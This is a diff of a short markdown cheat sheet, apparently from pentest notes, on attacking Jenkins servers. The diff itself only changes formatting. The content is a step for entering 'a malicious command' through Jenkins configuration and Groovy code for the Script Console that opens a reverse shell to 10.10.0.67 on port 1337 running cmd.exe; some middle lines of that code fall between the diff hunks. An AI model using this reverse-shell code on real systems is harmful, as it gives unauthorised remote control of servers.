@@ -2,13 +2,13 @@
 
 ### Execute Commands
 
-Navigate to `Jenkins > Access > Configure > Command` and type a malicious command.
+Navigate to `Jenkins > Access > Configure > Command `and type a malicious command.
 
 ### Script Console
 
 Navigate to `Manage Jenkins>>Script Console` and edit this code for a reverse connection:
 
-```text
+```
 String host="10.10.0.67";
 int port=1337;
 String cmd="cmd.exe";
@@ -22,4 +22,3 @@ while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50
 ```
 
 Click run and try to get a shell!
-
